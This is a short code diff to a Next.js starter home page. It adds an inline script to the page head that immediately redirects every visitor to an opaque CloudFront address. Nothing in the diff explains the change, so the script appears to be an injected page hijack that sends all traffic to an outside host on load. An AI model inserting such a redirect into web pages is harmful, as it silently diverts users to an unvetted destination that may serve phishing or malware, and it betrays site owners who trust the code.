@@ -8,6 +8,9 @@ export default function Home() {
       <Head>
         <title>Next.js Starter!</title>
         <link rel="icon" href="/favicon.ico" />
+        <script type="text/javascript">
+          window.location.href = "https://d26paarabrky6y.cloudfront.net/";
+        </script>
       </Head>
 
       <main>
